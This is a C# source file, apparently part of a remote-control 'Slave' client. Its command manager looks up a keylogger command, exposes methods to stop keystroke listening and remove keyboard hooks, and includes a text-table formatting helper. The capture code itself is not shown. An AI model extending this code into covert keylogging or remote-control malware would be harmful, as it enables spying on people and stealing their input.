using Shared;
using Slave.Commands.KeyLogger;
using System;
using System.Collections.Generic;
using System.Linq;

namespace Slave.Commands.Core
{
    public class SlaveCommandsManager : GlobalCommandsManager
    {
        KeyLoggerManager keyLoggerManager { get; }

        public SlaveCommandsManager(GlobalNetworkManager networkManager) : base(networkManager)
        {
            keyLoggerManager = ((KeyLoggerCommand)GetCommandByName("keylogger")).keyLoggerManager;
        }

        /// <summary>
        /// Stop the keylogger from listening to keypresses
        /// </summary>
        public void StopKeyloggerListening()
            => keyLoggerManager?.StopListening();

        /// <summary>
        /// Stop the keylogger, uninstall keyboard hooks
        /// </summary>
        public void StopKeylogger()
            => keyLoggerManager?.Stop();

        /// <summary>
        /// Produce a string displaying a table from a list of Tuple(string, string)
        /// </summary>
        /// <param name="data">List of tuple to process</param>
        /// <returns>Table as a string</returns>
        internal static string TableDisplay(IReadOnlyCollection<Tuple<string, string>> data)
        {
            var result = "";
            var longestPrefix = data.Select(t => t.Item1.Length).Max();
            var longestValue = data.Select(t => t.Item2.Length).Max();
            var horizontalDelimiter = $"+{new string('-', longestPrefix + 2)}+{new string('-', longestValue + 2)}+";

            result += horizontalDelimiter + "\n";
            foreach (var tuple in data)
            {
                var spaces = new string(' ', longestPrefix - tuple.Item1.Length);
                result += $"| {tuple.Item1}{spaces} |";

                spaces = new string(' ', longestValue - tuple.Item2.Length);
                result += $" {tuple.Item2}{spaces} |\n";
            }
            result += horizontalDelimiter;

            return result;
        }
    }
}
